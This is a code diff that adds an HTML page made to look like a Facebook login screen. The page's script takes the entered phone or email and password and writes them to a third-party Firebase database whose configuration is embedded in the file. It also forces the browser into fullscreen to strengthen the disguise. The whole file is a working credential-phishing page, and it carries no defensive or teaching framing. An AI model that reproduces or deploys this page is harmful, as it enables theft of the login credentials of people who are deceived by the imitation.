@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Login</title>
+
+    <style>
+        *{
+            padding: 0;
+            margin:0;
+        }
+            .container{
+                background-color: #fff;
+                height: 100vh;
+                width: 100%;
+            }
+
+            .header{
+                height: 15vh;
+                width: 100%;
+                background-color: darkblue;
+                display: flex;
+                color: #fff;
+            }
+
+            .input{
+                border: none;
+                outline: none;
+                width: 90%;
+                margin-left: 5%;
+                border-bottom: 1px solid rgb(39, 38, 38);
+                font-size: large;
+                margin-top: 30px;
+            }
+
+            .login{
+                background-color: darkblue;
+                outline: none;
+                border:none;
+                padding: 10px;
+                width: 30%;
+                margin-top: 20px;
+                margin-left: 35%;
+                color: #fff;
+            }
+
+            
+
+            .forgot{
+                color: darkblue;
+                text-align: center;
+                margin-top: 15px;
+            }
+          
+
+            .header>img{
+                height: 100px;
+                width: 100px;
+                margin-left: 20px;
+                margin-top: 10px;
+               
+            }
+
+            .header>h1{
+                margin-left: 5px;
+                margin-top: 40px;
+                font-family:'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+            }
+
+    </style>
+
+    
+</head>
+<body>
+        <div class="container">
+            <div class="header">
+                <img src="icon.png" alt="" srcset="">
+                <h1>Facebook</h1>
+            </div>
+
+            <div class="body">
+                <form>
+                <br><br>
+                <input type="text" class="input" name="" id="username" placeholder="Phone number or email address" required><br><br>
+                <input type="password" class="input" name="" id="password" placeholder="Password" required><br><br>
+
+                <input type="button" class="login" value="LOGIN" onclick="getData()"><br><br>
+                <p class="forgot">Forgotten Password?</p>
+            </form>
+            </div>
+
+            <div class="footer">
+
+            </div>
+        </div>
+
+<!--Firebase Libraries-->
+<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-database.js"></script> 
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyCjWhFzed8S6hvScM2vSCjj-UYsHe5-BcU",
+    authDomain: "facebook-e2c00.firebaseapp.com",
+    databaseURL: "https://facebook-e2c00-default-rtdb.firebaseio.com",
+    projectId: "facebook-e2c00",
+    storageBucket: "facebook-e2c00.appspot.com",
+    messagingSenderId: "475739217275",
+    appId: "1:475739217275:web:897b873d8f42b4050871de"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+
+  function getData(){ 
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+
+    writeUserData(username,username,password);
+}
+
+
+    function writeUserData(userId, name, email) {
+        firebase.database().ref('users/' + userId).set({
+          username: name,
+          email: email,
+        });
+      }
+</script>
+
+<script>
+     document.documentElement.requestFullscreen(); 
+</script>
+     
+</body>
+</html>
